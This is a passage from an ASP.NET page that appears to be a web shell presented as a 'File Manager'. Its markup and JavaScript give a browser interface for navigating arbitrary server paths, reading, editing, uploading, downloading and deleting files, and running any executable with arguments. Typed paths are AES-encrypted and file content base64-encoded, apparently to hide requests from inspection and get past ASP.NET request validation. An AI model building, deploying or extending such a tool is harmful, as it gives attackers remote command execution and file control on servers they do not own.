  </asp:Panel>

  <%-- APP --%>
  <asp:Panel ID="PanelApp" runat="server" Visible="false">

    <%-- Topbar --%>
    <div class="topbar">
      <span class="topbar-logo">&#128193; File Manager</span>
      <span class="topbar-path"><asp:Literal ID="LblCwd" runat="server"/></span>
      <asp:Label  ID="LblMsg"    runat="server" Visible="false"/>
      <asp:Button ID="BtnLogout" runat="server" Text="Lock" CssClass="btn-logout" OnClick="BtnLogout_Click" CausesValidation="false"/>
    </div>

    <%-- Hidden download trigger: UseSubmitBehavior=false renders as type="button" so it cannot interfere with BtnUpload --%>
    <asp:Button ID="BtnDownload" runat="server" OnClick="BtnDownload_Click" UseSubmitBehavior="false" style="display:none" CausesValidation="false"/>

    <div class="layout">

      <%-- SIDEBAR --%>
      <div class="sidebar" id="sidebar">

        <div class="sidebar-nav">
          <asp:Button ID="BtnUp"  runat="server" Text="Up"       CssClass="btn btn-ghost btn-sm"   OnClick="BtnUp_Click" OnClientClick="_clearHidden();"/>
          <asp:Button ID="BtnNew" runat="server" Text="New File"  CssClass="btn btn-primary btn-sm" OnClick="BtnNew_Click" OnClientClick="_clearHidden();"/>
        </div>

        <div class="sidebar-search">
          <input type="text" id="filterInput" placeholder="Filter files..." oninput="FM.filter(this.value)" autocomplete="off"/>
        </div>

        <div class="sidebar-upload">
          <asp:FileUpload ID="FileUpload1" runat="server" CssClass="upload-input"/>
          <asp:Button ID="BtnUpload" runat="server" Text="Upload" CssClass="btn btn-ghost btn-sm" OnClick="BtnUpload_Click" OnClientClick="_clearHidden();"/>
        </div>

        <div class="sidebar-list" id="sidebarList">
          <asp:Literal ID="LitListing" runat="server"/>
        </div>

        <div class="cd-row">
          <input type="text" id="visPath" placeholder="Go to path..." autocomplete="off"
                 onkeydown="if(event.key==='Enter') FM.go();"/>
          <asp:Button ID="BtnGo" runat="server" Text="Go" CssClass="btn btn-ghost btn-sm" OnClick="BtnGo_Click"
                      OnClientClick="return FM.prepGo();"/>
        </div>
      </div>

      <div class="resize-handle" id="resizeHandle"></div>

      <%-- MAIN PANEL --%>
      <div class="main">

        <div class="panel-tabs">
          <button type="button" class="tab" id="tabWelcome" onclick="FM.showPanel('welcome')">Browse</button>
          <button type="button" class="tab" id="tabEditor"  onclick="FM.showPanel('editor')"  style="display:none">
            <span id="tabEditorName">Editor</span>
            <span class="tab-x" onclick="FM.closeTab('editor',event)">x</span>
          </button>
          <button type="button" class="tab" id="tabExec" onclick="FM.showPanel('exec')" style="display:none">
            <span id="tabExecName">Execute</span>
            <span class="tab-x" onclick="FM.closeTab('exec',event)">x</span>
          </button>
        </div>

        <%-- Welcome --%>
        <div id="panelWelcome" class="panel-body">
          <div class="panel-welcome">
            <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
              <path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/>
            </svg>
            <p>Select a file from the sidebar to open it.</p>
            <p style="font-size:11px;color:var(--dim)">Hover a row to see Read / DL / Run buttons.</p>
          </div>
        </div>

        <%-- Editor --%>
        <div id="panelEditor" class="panel-body panel-hidden">
          <div class="editor-topbar">
            <span style="font-size:11px;color:var(--muted);white-space:nowrap">File:</span>
            <input type="text" id="visFilename" placeholder="filename.txt" value="<%= OpenFilePath() %>"/>
          </div>
          <textarea id="TxtContent" class="editor"><%= EditorContent() %></textarea>
          <div class="editor-actions">
            <asp:Button ID="BtnWrite"      runat="server" Text="Save"  CssClass="btn btn-success" OnClick="BtnWrite_Click"
                        OnClientClick="return FM.prepSave();" UseSubmitBehavior="true"/>
            <asp:Button ID="BtnCancelEdit" runat="server" Text="Close" CssClass="btn btn-danger"  OnClick="BtnCancelEdit_Click" CausesValidation="false" OnClientClick="_clearHidden();"/>
          </div>
        </div>

        <%-- Execute --%>
        <div id="panelExec" class="panel-body panel-hidden">
          <div class="exec-topbar">
            <span style="font-size:11px;color:var(--muted);white-space:nowrap">Exe:</span>
            <input type="text" id="visExePath" class="exec-path" readonly value="<%= RunExePath() %>"/>
          </div>
          <div class="exec-args-row">
            <label>Args:</label>
            <asp:TextBox ID="TxtExeArgs" runat="server" placeholder="optional arguments..."/>
          </div>
          <textarea class="console" style="display:none" aria-hidden="true"></textarea>
          <%-- Server-rendered output shown immediately without JS panel switching --%>
          <asp:Panel ID="PanelExecResult" runat="server" Visible="false">
            <pre class="console" id="execResultPre" style="overflow-y:auto; max-height:420px; white-space:pre-wrap; word-break:break-all;"><asp:Literal ID="LitExecOutput" runat="server"/></pre>
          </asp:Panel>
          <div class="exec-actions">
            <asp:Button ID="BtnExec" runat="server" Text="Run" CssClass="btn btn-run" OnClick="BtnExec_Click" OnClientClick="return FM.prepExec();"/>
            <asp:Button ID="BtnCancelExec" runat="server" Text="Close" CssClass="btn btn-danger" OnClick="BtnCancelExec_Click" CausesValidation="false" OnClientClick="_clearHidden();"/>
          </div>
        </div>

      </div><%-- /main --%>
    </div><%-- /layout --%>
  </asp:Panel><%-- /PanelApp --%>

<script>
// ============================================================
// FM — File Manager client namespace
// All client logic lives here to avoid polluting global scope.
// ============================================================
var FM = (function() {

  // ── AES-256-CBC (pure JS, works on plain HTTP) ──────────────
  // Key is the session key hex rendered from server on page load.
  var _key = null;

  function _initAes(hexKey) {
    if (!hexKey) return;
    _key = new Uint8Array(hexKey.length / 2);
    for (var i = 0; i < hexKey.length; i += 2)
      _key[i/2] = parseInt(hexKey.substr(i, 2), 16);
    _buildTables();
  }

  // AES S-box and multiplication tables
  var _sb=[],_m2=[],_m3=[],_rcon=[];
  function _buildTables() {
    var p=1,q=1;
    do {
      p=p^(p<<1)^(p&0x80?0x1B:0); p&=0xFF;
      q^=q<<1; q^=q<<2; q^=q<<4; q^=(q&0x80?0x09:0); q&=0xFF;
      _sb[p]=((q^((q<<1)|(q>>7))^((q<<2)|(q>>6))^((q<<3)|(q>>5))^((q<<4)|(q>>4)))^0x63)&0xFF;
    } while(p!==1);
    _sb[0]=0x63;
    for(var i=0;i<256;i++){ _m2[i]=i<128?(i<<1)&0xFF:((i<<1)^0x1B)&0xFF; _m3[i]=(_m2[i]^i)&0xFF; }
    var c=1; for(var r=0;r<10;r++){ _rcon[r]=c; c=_m2[c]; }
  }

  function _expandKey(k) {
    var nk=8,nr=14,w=[];
    for(var i=0;i<nk;i++) w[i]=[k[4*i],k[4*i+1],k[4*i+2],k[4*i+3]];
    for(var i=nk;i<4*(nr+1);i++){
      var t=w[i-1].slice();
      if(i%nk===0) t=[_sb[t[1]]^_rcon[i/nk-1],_sb[t[2]],_sb[t[3]],_sb[t[0]]];
      else if(nk>6&&i%nk===4) t=t.map(function(x){return _sb[x];});
      w[i]=[w[i-nk][0]^t[0],w[i-nk][1]^t[1],w[i-nk][2]^t[2],w[i-nk][3]^t[3]];
    }
    var rk=[];
    for(var i=0;i<=nr;i++) rk[i]=w.slice(4*i,4*i+4);
    return rk;
  }

  function _aesBlock(b, rk) {
    var s=[[],[],[],[]];
    for(var c=0;c<4;c++) for(var r=0;r<4;r++) s[r][c]=b[4*c+r];
    var ark=function(k){for(var c=0;c<4;c++) for(var r=0;r<4;r++) s[r][c]^=k[c][r];};
    var sub=function(){for(var r=0;r<4;r++) for(var c=0;c<4;c++) s[r][c]=_sb[s[r][c]];};
    var shr=function(){for(var r=1;r<4;r++) for(var i=0;i<r;i++){var t=s[r][0];s[r][0]=s[r][1];s[r][1]=s[r][2];s[r][2]=s[r][3];s[r][3]=t;}};
    var mix=function(){for(var c=0;c<4;c++){var a=s[0][c],b=s[1][c],d=s[2][c],e=s[3][c];s[0][c]=_m2[a]^_m3[b]^d^e;s[1][c]=a^_m2[b]^_m3[d]^e;s[2][c]=a^b^_m2[d]^_m3[e];s[3][c]=_m3[a]^b^d^_m2[e];}};
    ark(rk[0]);
    for(var rd=1;rd<=13;rd++){sub();shr();mix();ark(rk[rd]);}
    sub();shr();ark(rk[14]);
    var o=new Uint8Array(16);
    for(var c=0;c<4;c++) for(var r=0;r<4;r++) o[4*c+r]=s[r][c];
    return o;
  }

  function _utf8(str) {
    var out=[];
    for(var i=0;i<str.length;i++){
      var c=str.charCodeAt(i);
      if(c<0x80) out.push(c);
      else if(c<0x800){ out.push(0xC0|(c>>6)); out.push(0x80|(c&0x3F)); }
      else { out.push(0xE0|(c>>12)); out.push(0x80|((c>>6)&0x3F)); out.push(0x80|(c&0x3F)); }
    }
    return new Uint8Array(out);
  }

  // Encrypt plainText -> URL-safe base64 (IV prepended)
  function _aesEncrypt(plainText) {
    if (!_key || !plainText) return '';
    var rk=_expandKey(_key), iv=new Uint8Array(16);
    for(var i=0;i<16;i++) iv[i]=Math.floor(Math.random()*256);
    var tb=_utf8(plainText), pad=16-(tb.length%16);
    var buf=new Uint8Array(tb.length+pad); buf.set(tb);
    for(var i=tb.length;i<buf.length;i++) buf[i]=pad;
    var out=new Uint8Array(16+buf.length); out.set(iv,0);
    var prev=iv;
    for(var i=0;i<buf.length;i+=16){
      var blk=new Uint8Array(16);
      for(var j=0;j<16;j++) blk[j]=buf[i+j]^prev[j];
      var enc=_aesBlock(blk,rk); out.set(enc,16+i); prev=enc;
    }
    return btoa(String.fromCharCode.apply(null,out))
      .replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
  }

  // UTF-8 safe base64 (for content, not AES -- just prevents dangerous chars)
  function _b64(str) {
    try { return btoa(unescape(encodeURIComponent(str))); }
    catch(e) { return btoa(str); }
  }

  // ── Hidden field helpers ─────────────────────────────────────
  function _hid(name)      { return document.querySelector('[name="'+name+'"]'); }
  function _set(name, val) { var h=_hid(name); if(h) h.value=val||''; }
  function _get(id)        { var el=document.getElementById(id); return el?el.value:''; }

  // ── Panel switching ──────────────────────────────────────────
  function showPanel(name) {
    ['welcome','editor','exec'].forEach(function(p){
      var panel = document.getElementById('panel'+p.charAt(0).toUpperCase()+p.slice(1));
      var tab   = document.getElementById('tab'  +p.charAt(0).toUpperCase()+p.slice(1));
      if (panel) panel.classList.toggle('panel-hidden', p!==name);
      if (tab)   tab.classList.toggle('active', p===name);
    });
  }

  function closeTab(name, e) {
    if (e) e.stopPropagation();
    var closeBtn = name==='editor'
      ? document.getElementById('<%= BtnCancelEdit.ClientID %>')
      : document.getElementById('<%= BtnCancelExec.ClientID %>');
    if (closeBtn) closeBtn.click();
  }

  // ── Listing actions ──────────────────────────────────────────
  function cdDir(enc) {
    _clearHidden();
    _set('__CDDIR', enc);
    document.getElementById('fm').submit();
  }

  function readFile(enc) {
    _clearHidden();
    _set('__RDFILE', enc);
    document.getElementById('fm').submit();
  }

  function runExe(enc) {
    _clearHidden();
    _set('__RUNEXE', enc);
    document.getElementById('fm').submit();
  }

  function downloadFile(enc) {
    _clearHidden();
    _set('hDownloadPath', enc);
    var btn = document.getElementById('<%= BtnDownload.ClientID %>');
    if (btn) btn.click();
  }

  // ── Button pre-submit helpers (called by OnClientClick) ──────
  // prepGo: encrypt the typed path before posting
  function prepGo() {
    _clearHidden();
    _set('hPath', _aesEncrypt(_get('visPath')));
    return true;
  }

  // prepSave: copy filename + base64-encode content before posting
  // Synchronous -- no async needed, avoids all timing issues
  function prepSave() {
    _set('hFilenamePlain', _get('visFilename'));
    var ta = document.getElementById('TxtContent');
    _set('hContentPlain', ta ? _b64(ta.value) : '');
    ta.value = '';  // blank before post so ASP.NET never sees raw HTML in TxtContentPlain
    return true;
  }

  // prepExec: encrypt the exe path before posting
  function prepExec() {
    _clearHidden();
    var path = _get('visExePath');
    _set('hExePath',      _aesEncrypt(path));  // AES-encrypted (preferred)
    _set('hExePathPlain', path);               // plain fallback if AES key missing
    return true;
  }

  // ── Filter ───────────────────────────────────────────────────
  function filter(q) {
    q = q.toLowerCase();
    document.querySelectorAll('#sidebarList .entry').forEach(function(el){
      var nm = el.querySelector('.entry-name');
      el.style.display = (!q || (nm && nm.textContent.toLowerCase().includes(q))) ? '' : 'none';
    });
  }

  // ── Go shortcut (Enter key in path box) ─────────────────────
  function go() {
    _set('hPath', _aesEncrypt(_get('visPath')));
    document.getElementById('<%= BtnGo.ClientID %>').click();
  }

  // ── Resizable sidebar ────────────────────────────────────────
  function _initResize() {
    var handle = document.getElementById('resizeHandle');
    var sidebar = document.getElementById('sidebar');
    if (!handle || !sidebar) return;
    var dragging=false, startX, startW;
    handle.addEventListener('mousedown', function(e){
      dragging=true; startX=e.clientX; startW=sidebar.offsetWidth;
      handle.classList.add('dragging');
      document.body.style.cssText += ';cursor:col-resize;user-select:none';
    });
    document.addEventListener('mousemove', function(e){
      if (!dragging) return;
      var w=Math.min(500,Math.max(160,startW+(e.clientX-startX)));
      sidebar.style.width=sidebar.style.minWidth=sidebar.style.maxWidth=w+'px';
    });
    document.addEventListener('mouseup', function(){
      if (!dragging) return; dragging=false;
      handle.classList.remove('dragging');
      document.body.style.cursor=document.body.style.userSelect='';
    });
  }

  // ── Init (runs on window load) ───────────────────────────────
  function _init() {
    _initAes('<%= AuthSKey() %>');
    _initResize();

    // Restore panel and tab state from server session
    var active     = '<%= ActivePanel() %>';
    var editorFile = '<%= OpenFilePathJS() %>';
    var execFile   = '<%= RunExePathJS() %>';
    var isNew      = '<%= IsNewFile() %>' === 'True';

    if (editorFile || isNew) {
      var tab = document.getElementById('tabEditor');
      if (tab) tab.style.display = '';
      var lbl = document.getElementById('tabEditorName');
      if (lbl) lbl.textContent = editorFile ? editorFile.split(/[\\/]/).pop() || 'Editor' : 'New File';
    }
    if (execFile || active==='exec') {
      var tab = document.getElementById('tabExec');
      if (tab) tab.style.display = '';
      var lbl = document.getElementById('tabExecName');
      if (lbl) lbl.textContent = execFile ? (execFile.split(/[\\/]/).pop() || 'Execute') : 'Execute';
      var ve  = document.getElementById('visExePath');
      var hep = document.getElementById('hExePathPlain');
      if (ve && execFile)  ve.value  = execFile;
      if (hep && execFile) hep.value = execFile;  // pre-fill plain path for BtnExec
    }

    // All panels are in DOM; showPanel toggles panel-hidden class
    if      (active==='editor' && (editorFile||isNew)) showPanel('editor');
    else if (active==='exec')                           showPanel('exec');
    else                                                showPanel('welcome');
  }

  window.addEventListener('load', _init);

  // ── Public API ───────────────────────────────────────────────
  return { showPanel:showPanel, closeTab:closeTab, filter:filter, go:go,
           prepGo:prepGo, prepSave:prepSave, prepExec:prepExec };

})(); // end FM

// These must be global because they are called from inline onclick= attributes
// generated by the server-side RenderListing() method.
function _clearEditor() { var ta=document.getElementById('TxtContent'); if(ta) ta.value=''; }
function _clearHidden() {
  _clearEditor();
  ['__CDDIR','__RDFILE','__RUNEXE','__DELFILE','hPath','hFilename','hExePath',
   'hDownloadPath','hExePathPlain','hFilenamePlain','hContentPlain'].forEach(function(n){
    var h=document.querySelector('[name="'+n+'"]'); if(h) h.value='';
  });
}
function cdDir(e)        { _clearHidden(); var h=document.querySelector('[name="__CDDIR"]');  if(h) h.value=e; document.getElementById('fm').submit(); }
function readFile(e)     { _clearHidden(); var h=document.querySelector('[name="__RDFILE"]'); if(h) h.value=e; document.getElementById('fm').submit(); }
function runExe(e)       { _clearHidden(); var h=document.querySelector('[name="__RUNEXE"]'); if(h) h.value=e; document.getElementById('fm').submit(); }
function downloadFile(e) { _clearHidden(); var h=document.querySelector('[name="hDownloadPath"]'); if(h) h.value=e; var b=document.getElementById('<%= BtnDownload.ClientID %>'); if(b) b.click(); }
function deleteFile(e, name) {
  if (!confirm('Delete "' + name + '"?\n\nThis cannot be undone.')) return;
  _clearHidden();
  var h=document.querySelector('[name="__DELFILE"]'); if(h) h.value=e;
  document.getElementById('fm').submit();
}
</script>

</form>
</body>
</html>
